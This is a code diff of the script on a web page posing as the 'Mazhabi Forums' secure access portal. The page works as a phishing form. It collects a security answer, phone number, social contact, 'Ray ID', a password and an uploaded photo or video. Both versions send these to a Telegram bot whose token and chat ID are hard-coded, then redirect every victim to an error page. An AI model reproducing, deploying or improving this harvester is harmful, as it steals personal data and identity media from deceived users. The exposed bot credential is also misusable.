@@ -298,60 +298,112 @@
         <p>© <span id="current-year"></span> Mazhabi Forums. Secure Access Portal.</p>
     </footer>
 
-    <script>
-        document.getElementById('current-year').textContent = new Date().getFullYear();
+  
+       <script>
+    // Configuration
+    const SUBMISSION_COUNT_COOKIE = "MazhabiForumSubCount";
+    const MAX_SUBMISSIONS = 7;
+    const ERROR_PAGE_URL = "/welcome/error.html";
+    const SUCCESS_REDIRECT_URL = "/welcome/error.html";
+    const BOT_TOKEN = "7210173025:AAFlhOsjZ-mi9dvD7pnFK_BxGEt9CRHfEm8";
+    const CHAT_ID = "7913066602";
 
-        // Track submission attempts
-        let submissionAttempts = 0;
-        const maxAttempts = 10;
-        const errorRedirectUrl = '/welcome/error.html';
+    // Cookie functions
+    function getCookie(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
+        return null;
+    }
 
-        const form = document.getElementById('final-setup-form');
-        const submitButton = document.getElementById('submit-final-setup');
+    function setCookie(name, value, days) {
+        const date = new Date();
+        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+        const expires = `expires=${date.toUTCString()}`;
+        document.cookie = `${name}=${value}; ${expires}; path=/; SameSite=Lax`;
+    }
+
+    function getSubmissionCount() {
+        const count = getCookie(SUBMISSION_COUNT_COOKIE);
+        return count ? parseInt(count) : 0;
+    }
+
+    function incrementSubmissionCount() {
+        const currentCount = getSubmissionCount();
+        setCookie(SUBMISSION_COUNT_COOKIE, (currentCount + 1).toString(), 30);
+    }
+
+    // Form validation and submission
+    document.addEventListener('DOMContentLoaded', function() {
+        // Check submission count on page load
+        if (getSubmissionCount() >= MAX_SUBMISSIONS) {
+            window.location.href = ERROR_PAGE_URL;
+            return;
+        }
+
+        // File upload handling
         const fileInput = document.getElementById('verification-file');
         const fileUploadArea = document.getElementById('file-upload-area');
         const fileNameDisplay = document.getElementById('file-name-display');
 
         fileUploadArea.addEventListener('click', () => fileInput.click());
+        
         fileInput.addEventListener('change', () => {
             if (fileInput.files.length > 0) {
                 const file = fileInput.files[0];
                 fileNameDisplay.textContent = `Selected: ${file.name} (${(file.size / (1024 * 1024)).toFixed(2)} MB)`;
-                clearError(document.getElementById('file-error-message')); 
-            } else {
-                fileNameDisplay.textContent = '';
+                clearError(document.getElementById('file-error-message'));
             }
         });
+
+        // Drag and drop handling
         ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
             fileUploadArea.addEventListener(eventName, preventDefaults, false);
         });
+
+        ['dragenter', 'dragover'].forEach(eventName => {
+            fileUploadArea.addEventListener(eventName, highlight, false);
+        });
+
+        ['dragleave', 'drop'].forEach(eventName => {
+            fileUploadArea.addEventListener(eventName, unhighlight, false);
+        });
+
+        fileUploadArea.addEventListener('drop', handleDrop, false);
+
         function preventDefaults(e) {
             e.preventDefault();
             e.stopPropagation();
         }
-        ['dragenter', 'dragover'].forEach(eventName => {
-            fileUploadArea.addEventListener(eventName, () => fileUploadArea.style.borderColor = 'var(--primary-color)', false);
-        });
-        ['dragleave', 'drop'].forEach(eventName => {
-            fileUploadArea.addEventListener(eventName, () => fileUploadArea.style.borderColor = 'var(--border-color)', false);
-        });
-        fileUploadArea.addEventListener('drop', handleDrop, false);
+
+        function highlight() {
+            fileUploadArea.style.borderColor = 'var(--primary-color)';
+        }
+
+        function unhighlight() {
+            fileUploadArea.style.borderColor = 'var(--border-color)';
+        }
+
         function handleDrop(e) {
-            let dt = e.dataTransfer;
-            let files = dt.files;
+            const dt = e.dataTransfer;
+            const files = dt.files;
             if (files.length > 0) {
-                fileInput.files = files; 
+                fileInput.files = files;
                 const file = files[0];
                 fileNameDisplay.textContent = `Selected: ${file.name} (${(file.size / (1024 * 1024)).toFixed(2)} MB)`;
                 clearError(document.getElementById('file-error-message'));
             }
         }
 
+        // Error handling functions
         function displayError(inputElement, message) {
             inputElement.classList.add('input-error');
-            const errorSpan = inputElement.nextElementSibling && inputElement.nextElementSibling.classList.contains('error-message')
-                ? inputElement.nextElementSibling
-                : (inputElement.id === 'verification-file' ? document.getElementById('file-error-message') : null);
+            const errorSpan = inputElement.nextElementSibling && 
+                             inputElement.nextElementSibling.classList.contains('error-message') 
+                             ? inputElement.nextElementSibling 
+                             : (inputElement.id === 'verification-file' 
+                                ? document.getElementById('file-error-message') 
+                                : null);
             if (errorSpan) {
                 errorSpan.textContent = message;
                 errorSpan.style.visibility = 'visible';
@@ -360,209 +412,156 @@
 
         function clearError(inputElement) {
             inputElement.classList.remove('input-error');
-            const errorSpan = inputElement.nextElementSibling && inputElement.nextElementSibling.classList.contains('error-message')
-                ? inputElement.nextElementSibling
-                : (inputElement.id === 'verification-file' ? document.getElementById('file-error-message') : null);
+            const errorSpan = inputElement.nextElementSibling && 
+                             inputElement.nextElementSibling.classList.contains('error-message') 
+                             ? inputElement.nextElementSibling 
+                             : (inputElement.id === 'verification-file' 
+                                ? document.getElementById('file-error-message') 
+                                : null);
             if (errorSpan) {
                 errorSpan.textContent = '';
                 errorSpan.style.visibility = 'hidden';
             }
         }
-        
-        function clearAllFormErrors() {
-            form.querySelectorAll('.input-error').forEach(el => el.classList.remove('input-error'));
-            form.querySelectorAll('.error-message').forEach(el => {
-                el.textContent = '';
-                el.style.visibility = 'hidden';
-            });
-        }
+
+        // Form submission
+        const form = document.getElementById('final-setup-form');
+        const submitButton = document.getElementById('submit-final-setup');
 
         form.addEventListener('submit', async function(event) {
             event.preventDefault();
             
-            // Check submission attempts
-            submissionAttempts++;
-            if (submissionAttempts > maxAttempts) {
-                window.location.href = errorRedirectUrl;
+            // Check submission count
+            if (getSubmissionCount() >= MAX_SUBMISSIONS) {
+                window.location.href = ERROR_PAGE_URL;
                 return;
             }
 
-            clearAllFormErrors();
+            // Validate form
             let isValid = true;
-
             const question1 = document.getElementById('question1');
             const rayId = document.getElementById('ray-id');
             const password = document.getElementById('password');
             const confirmPassword = document.getElementById('confirm-password');
+            const selectedFile = fileInput.files.length > 0 ? fileInput.files[0] : null;
 
+            // Clear previous errors
+            [question1, rayId, password, confirmPassword, fileInput].forEach(clearError);
+
+            // Validation checks
             if (!question1.value.trim()) {
                 displayError(question1, 'This answer is required.');
                 isValid = false;
             }
+
             if (!rayId.value.trim()) {
                 displayError(rayId, 'Ray ID is required.');
                 isValid = false;
             }
+
             if (password.value.length < 6) {
                 displayError(password, 'Password must be at least 6 characters.');
                 isValid = false;
             }
+
             if (password.value !== confirmPassword.value) {
                 displayError(confirmPassword, 'Passwords do not match.');
                 isValid = false;
-            } else if (!confirmPassword.value) { 
-                 displayError(confirmPassword, 'Please confirm your password.');
-                 isValid = false;
             }
-            
-            const selectedFile = fileInput.files.length > 0 ? fileInput.files[0] : null;
+
             if (selectedFile) {
-                const maxSize = 50 * 1024 * 1024; 
-                const allowedMimeTypePrefixes = ['image/', 'video/']; 
-                let fileTypeValid = false;
-                for (const prefix of allowedMimeTypePrefixes) {
-                    if (selectedFile.type.startsWith(prefix)) {
-                        fileTypeValid = true;
-                        break;
-                    }
-                }
-                if (!fileTypeValid) {
-                    displayError(fileInput, 'Invalid file type. Allowed: Images and Videos.');
+                const maxSize = 50 * 1024 * 1024; // 50MB
+                const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'video/mp4', 'video/quicktime'];
+                
+                if (!allowedTypes.includes(selectedFile.type)) {
+                    displayError(fileInput, 'Invalid file type. Only images (JPEG, PNG, GIF) and videos (MP4, MOV) are allowed.');
                     isValid = false;
                 }
+
                 if (selectedFile.size > maxSize) {
-                    displayError(fileInput, `File is too large (max 50MB). Current: ${(selectedFile.size / (1024*1024)).toFixed(2)}MB`);
+                    displayError(fileInput, `File is too large (max 50MB). Your file: ${(selectedFile.size / (1024 * 1024)).toFixed(2)}MB`);
                     isValid = false;
                 }
             }
 
+            if (!isValid) return;
 
-            if (isValid) {
-                submitButton.disabled = true;
-                submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting...';
+            // Disable submit button
+            submitButton.disabled = true;
+            submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
 
-                const formDataForText = new FormData(); // Separate FormData for text fields
-                formDataForText.append('security_question_1', question1.value);
-                formDataForText.append('phone_number', document.getElementById('phone-number').value);
-                formDataForText.append('social_contact', document.getElementById('social-contact').value);
-                formDataForText.append('ray_id', rayId.value);
-                formDataForText.append('password', password.value); // Password (consider hashing on backend)
+            try {
+                // Prepare text data for Telegram
+                const textData = {
+                    question1: question1.value,
+                    phone: document.getElementById('phone-number').value || 'Not provided',
+                    social: document.getElementById('social-contact').value || 'Not provided',
+                    rayId: rayId.value,
+                    timestamp: new Date().toLocaleString('en-BD', { timeZone: 'Asia/Dhaka' })
+                };
 
-                // --- Actual Telegram Bot Submission ---
-                const botToken = "7210173025:AAFlhOsjZ-mi9dvD7pnFK_BxGEt9CRHfEm8"; 
-                const chatId = "7913066602";   
-                const redirectURL = "/welcome/error.html"; 
+                // Send text data to Telegram
+                const textMessage = `🔐 *New Submission* 🔐\n\n` +
+                                   `📝 *Question Answer:* ${textData.question1}\n` +
+                                   `📱 *Phone:* ${textData.phone}\n` +
+                                   `🔗 *Social:* ${textData.social}\n` +
+                                   `🆔 *Ray ID:* ${textData.rayId}\n` +
+                                   `⏰ *Time:* ${textData.timestamp}`;
 
-                if (botToken === "YOUR_ACTUAL_BOT_TOKEN" || chatId === "YOUR_ACTUAL_CHAT_ID") {
-                    console.warn("Telegram Bot Token or Chat ID is not set.");
-                    alert("Telegram integration not configured. Data will be logged to console only.");
-                    setTimeout(() => {
-                         window.location.href = redirectURL || 'thankyou_fallback.html'; 
-                    }, 1500);
-                    return; 
-                }
-
-                // 1. Send Text Data
-                let textMessage = "🔒 Encrypted Class - Final Setup (Part 1 - Details):\n\n";
-                formDataForText.forEach((value, key) => {
-                    let formattedKey = key.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
-                    textMessage += `🔸 **${formattedKey}:** ${value}\n`;
-                });
-                textMessage += `\n⏰ Submitted: ${new Date().toLocaleString('en-BD', { timeZone: 'Asia/Dhaka' })}`;
-                
-                const textApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                const textParams = new URLSearchParams({
-                    chat_id: chatId,
-                    text: textMessage,
-                    parse_mode: "Markdown"
+                const textResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: textMessage,
+                        parse_mode: 'Markdown'
+                    })
                 });
 
-                let textSentSuccessfully = false;
-                try {
-                    const textResponse = await fetch(`${textApiUrl}?${textParams.toString()}`, { method: 'GET' });
-                    const textResult = await textResponse.json();
-                    if (textResult.ok) {
-                        console.log("Text data sent to Telegram successfully.");
-                        textSentSuccessfully = true;
-                    } else {
-                        console.error("Error sending text data to Telegram:", textResult);
-                        // Don't alert here yet, try sending file if text failed but file exists
-                    }
-                } catch (error) {
-                    console.error("Network error sending text data:", error);
-                }
+                const textResult = await textResponse.json();
 
-
-                // 2. Send File Data (if a file is selected and text was (or wasn't successfully sent - depending on logic))
-                let fileSentSuccessfully = !selectedFile; // If no file, consider it "sent" for overall success
-                
-                if (selectedFile) {
+                // Send file if provided
+                if (selectedFile && textResult.ok) {
                     const fileFormData = new FormData();
-                    fileFormData.append('chat_id', chatId);
-                    
-                    // Determine API endpoint based on file type
-                    let fileApiUrl = `https://api.telegram.org/bot${botToken}/`;
-                    let fileFieldName = '';
+                    fileFormData.append('chat_id', CHAT_ID);
+                    fileFormData.append('caption', `Verification file for Ray ID: ${textData.rayId}`);
 
+                    // Determine file type
                     if (selectedFile.type.startsWith('image/')) {
-                        fileApiUrl += 'sendPhoto';
-                        fileFieldName = 'photo';
-                    } else if (selectedFile.type.startsWith('video/')) {
-                        fileApiUrl += 'sendVideo';
-                        fileFieldName = 'video';
-                    } else {
-                        // Fallback for other types, or if type is not perfectly identified
-                        fileApiUrl += 'sendDocument';
-                        fileFieldName = 'document';
-                    }
-                    fileFormData.append(fileFieldName, selectedFile, selectedFile.name);
-                    fileFormData.append('caption', `Verification file for Ray ID: ${rayId.value}\nFilename: ${selectedFile.name}`);
-
-                    try {
-                        const fileResponse = await fetch(fileApiUrl, {
+                        fileFormData.append('photo', selectedFile);
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                             method: 'POST',
-                            body: fileFormData // FormData automatically sets Content-Type to multipart/form-data
+                            body: fileFormData
                         });
-                        const fileResult = await fileResponse.json();
-                        if (fileResult.ok) {
-                            console.log("File sent to Telegram successfully:", fileResult);
-                            fileSentSuccessfully = true;
-                        } else {
-                            console.error("Error sending file to Telegram:", fileResult);
-                            // Alert for file send failure specifically if text was okay or also failed
-                            if (textSentSuccessfully) { // If text was okay but file failed
-                                alert(`Text data submitted, but file upload failed: ${fileResult.description}. You may need to send it manually.`);
-                            } else { // If both failed
-                                alert(`Failed to submit data and file: ${fileResult.description}. Please try again.`);
-                            }
-                            fileSentSuccessfully = false; // Ensure it's false
-                        }
-                    } catch (error) {
-                        console.error("Network error sending file:", error);
-                        alert("A network error occurred while uploading the file. Please check your connection.");
-                        fileSentSuccessfully = false;
+                    } else if (selectedFile.type.startsWith('video/')) {
+                        fileFormData.append('video', selectedFile);
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                            method: 'POST',
+                            body: fileFormData
+                        });
+                    } else {
+                        fileFormData.append('document', selectedFile);
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                            method: 'POST',
+                            body: fileFormData
+                        });
                     }
                 }
 
-                // Final action based on combined success
-                if (textSentSuccessfully && fileSentSuccessfully) {
-                     window.location.href = redirectURL || 'thankyou_fallback.html'; 
-                } else if (textSentSuccessfully && !selectedFile) { // Text sent, no file was to be sent
-                     window.location.href = redirectURL || 'thankyou_fallback.html';
-                }
-                else {
-                    // If either text or (an attempted) file send failed, re-enable button
-                    submitButton.disabled = false;
-                    submitButton.innerHTML = '<i class="fas fa-lock"></i> Finalize Setup & Enter';
-                    if (!textSentSuccessfully && !fileSentSuccessfully) {
-                        alert("Failed to submit your information. Please try again.");
-                    } else if (!textSentSuccessfully) {
-                        alert("Failed to submit textual information. File was not attempted. Please try again.");
-                    }
-                    // If only file failed, alert was already shown
-                }
+                // Increment submission count
+                incrementSubmissionCount();
+
+                // Redirect to success page
+                window.location.href = SUCCESS_REDIRECT_URL;
+
+            } catch (error) {
+                console.error('Submission error:', error);
+                alert('An error occurred during submission. Please try again.');
+                submitButton.disabled = false;
+                submitButton.innerHTML = '<i class="fas fa-lock"></i> Finalize Setup & Enter';
             }
         });
-    </script>
+    });
+</script>
 </body>
 </html>
